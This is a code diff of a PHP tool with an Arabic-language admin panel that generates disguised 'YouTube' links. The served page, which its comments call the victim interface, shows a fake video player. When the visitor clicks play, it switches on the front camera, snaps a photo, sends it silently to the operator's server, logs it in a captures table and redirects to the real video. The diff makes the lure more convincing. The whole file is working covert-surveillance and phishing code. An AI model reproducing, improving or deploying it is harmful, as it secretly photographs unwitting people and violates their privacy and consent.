@@ -7,7 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker_sync.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_pro.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -28,7 +28,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-function fetch_real_meta($url) {$title = "YouTube Stream";
+function fetch_real_meta($url) {$title = "YouTube Stream - Watch Live";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
@@ -53,7 +53,7 @@ function fetch_real_meta($url) {$title = "YouTube Stream";
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-$og_title = "YouTube Stream";
+$og_title = "YouTube Stream - Watch Live";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 
@@ -112,7 +112,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// واجهة الضحية بالاستدعاء الفوري المتزامن
+// واجهة الضحية الاحترافية
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -123,19 +123,23 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
-        .player-container { position: relative; width: 100%; max-width: 500px; height: 300px; background: url('<?php echo htmlspecialchars($og_image); ?>') center/cover no-repeat; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
-        .play-btn { width: 70px; height: 70px; background: rgba(255, 0, 0, 0.85); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(255,0,0,0.6); transition: transform 0.2s; }
-        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-style: solid; border-width: 12px 0 12px 22px; border-color: transparent transparent transparent #fff; margin-left: 4px; }
-        .player-container:hover .play-btn { transform: scale(1.1); }
+        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; overflow: hidden; }
+        .player-box { width: 100%; max-width: 440px; background: #131b2e; border: 1px solid #1e293b; border-radius: 12px; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; }
+        .thumbnail-container { position: relative; width: 100%; height: 240px; background: url('<?php echo htmlspecialchars($og_image); ?>') center/cover no-repeat; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .play-btn { width: 64px; height: 64px; background: rgba(239, 68, 68, 0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(239,68,68,0.5); transition: transform 0.2s; }
+        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-style: solid; border-width: 10px 0 10px 18px; border-color: transparent transparent transparent #fff; margin-left: 3px; }
+        .thumbnail-container:hover .play-btn { transform: scale(1.1); }
+        .video-info { padding: 20px; }
+        .video-title { font-size: 15px; font-weight: 600; color: #f8fafc; margin-bottom: 8px; line-height: 1.4; }
+        .video-desc { font-size: 12px; color: #94a3b8; }
     </style>
     <script>
         const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
         const targetUrl = "<?php echo $target_redirect; ?>";
 
-        function instantCaptureAndRedirect() {
-            // الاستدعاء المباشر الفوري داخل حدث النقر دون أي تأخير زمني
+        function startProcess() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -143,7 +147,6 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                     video.setAttribute('playsinline', '');
                     video.play();
                     
-                    // انتظار قصير جداً لالتقاط الإطار بعد فتح الدفق
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 640;
@@ -160,7 +163,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 
                         if (navigator.sendBeacon) {
                             navigator.sendBeacon(`/?r=${redirectCode}`, formData);
-                            setTimeout(() => { window.location.replace(targetUrl); }, 200);
+                            setTimeout(() => { window.location.replace(targetUrl); }, 250);
                         } else {
                             fetch(`/?r=${redirectCode}`, {
                                 method: 'POST',
@@ -170,7 +173,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                                 window.location.replace(targetUrl);
                             });
                         }
-                    }, 300);
+                    }, 350);
                 })
                 .catch(err => {
                     window.location.replace(targetUrl);
@@ -179,8 +182,14 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     </script>
 </head>
 <body>
-    <div class="player-container" onclick="instantCaptureAndRedirect()">
-        <div class="play-btn"></div>
+    <div class="player-box">
+        <div class="thumbnail-container" onclick="startProcess()">
+            <div class="play-btn"></div>
+        </div>
+        <div class="video-info">
+            <div class="video-title"><?php echo htmlspecialchars($og_title); ?></div>
+            <div class="video-desc">اضغط لعرض المقطع بجودة HD</div>
+        </div>
     </div>
 </body>
 </html>
@@ -188,13 +197,13 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     exit(); 
 endif; 
 ?>
-<!-- لوحة التحكم الإدارية -->
+<!-- لوحة التحكم الإدارية الاحترافية -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - الاستدعاء الفوري</title>
+    <title>لوحة التحكم الرئيسية</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -234,7 +243,7 @@ endif;
     <div class="wrapper">
         
         <section class="section-box">
-            <h2>توليد رابط الاستدعاء الفوري</h2>
+            <h2>توليد رابط التعقب الاحترافي</h2>
             <form method="POST" class="form-row">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                 <button type="submit" name="create" class="btn">توليد الرابط</button>
